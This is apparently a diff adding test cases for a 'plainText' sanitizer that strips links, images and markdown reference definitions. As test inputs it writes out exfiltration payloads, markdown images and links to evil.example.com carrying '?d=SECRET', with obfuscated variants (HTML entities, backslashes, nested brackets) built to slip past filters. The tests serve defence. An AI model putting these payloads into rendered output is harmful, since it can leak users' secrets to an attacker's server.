@@ -20,6 +20,40 @@ describe("plainText", () => {
     expect(plainText("\uff48\uff54\uff54\uff50\uff53://evil.example.com")).toBe("[link removed]");
   });
 
+  // A GFM renderer links a URL right after "_" or "*", and a reference
+  // definition ("[1]: address", also in a quote or a list) makes "![a][1]"
+  // or "![1]" an image wherever it is, so none of these may get through.
+  it("removes links glued to a word, links and images by reference, and reference definitions", () => {
+    expect(plainText("see _https://evil.example.com/x?d=SECRET_ now")).toBe("see _[link removed] now");
+    expect(plainText("_www.evil.example.com/x")).toBe("_[link removed]");
+    expect(plainText("![a][1]\n\n[1]: //evil.example.com/p.png?d=SECRET")).toBe("a\n\n1: [link removed]");
+    expect(plainText("xhttps://evil.example.com/x *www.evil.example.com xmpp:a@evil.example.com")).toBe(
+      "x[link removed] *[link removed] [link removed]",
+    );
+    expect(plainText("[click][r] or [here][]\n\n[r]: https://evil.example.com\n[here]: <https://evil.example.com>")).toBe(
+      "click or here\n\nr: [link removed]\nhere:",
+    );
+    expect(plainText("_https://cdn.shopify.com/s/files/1/proof.pdf_")).toBe("_https://cdn.shopify.com/s/files/1/proof.pdf_");
+    expect(plainText("Awww. Size [L]: 3 and [M]: 2, ship 10//12")).toBe("Awww. Size L: 3 and M: 2, ship 10//12");
+    // A reference definition needs "]:" right after its label and an inline
+    // link or image needs "](" right after its text; neither survives, however
+    // the address is written (entities, backslashes, angle brackets) or the
+    // brackets are nested, escaped or split by a tag.
+    const attacks = [
+      "![p]\n\n> [p]: &#47;&#47;evil.example.com/p.png",
+      "![p]\n\n- [p]:\n  <\\\\evil.example.com/p.png>",
+      "![a\\]b]\n\n[a\\]b]: &#47;&#47;evil.example.com/p.png",
+      "![1: x]\n\n[[1]: x]: &#47;&#47;evil.example.com/p.png",
+      "![1]\n\n[1]<b></b>: &#47;&#47;evil.example.com/p.png",
+      "![a [b] c](&#47;&#47;evil.example.com/p.png)",
+      "[a [b] c](x)(&#47;&#47;evil.example.com/p.png)",
+      "[a]<i></i>(&#47;&#47;evil.example.com/p.png)",
+    ];
+    for (const attack of attacks) {
+      expect(plainText(attack), attack).not.toMatch(/\]:|\]\(/);
+    }
+  });
+
   it("removes control and invisible characters, keeps line breaks, and caps the length", () => {
     expect(plainText("a\u0000b\u202ec\u200bd\ufeffe")).toBe("abcde");
     expect(plainText("line one\r\nline two\n\n\n\nline three")).toBe("line one\nline two\n\nline three");
